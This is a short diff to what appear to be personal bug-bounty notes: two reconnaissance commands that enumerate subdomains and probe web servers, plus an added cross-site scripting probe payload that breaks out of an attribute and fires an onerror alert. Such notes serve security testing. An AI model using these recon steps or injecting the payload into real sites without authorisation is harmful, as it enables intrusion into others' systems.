@@ -1,3 +1,5 @@
 1. subfinder -d <url> | httpx -title -ports 443, 8443 
 
 2. cat list.txt | httpx-toolkit -sc -td -title
+
+';"/> <Img src=X onerror=alert(Hooray)>
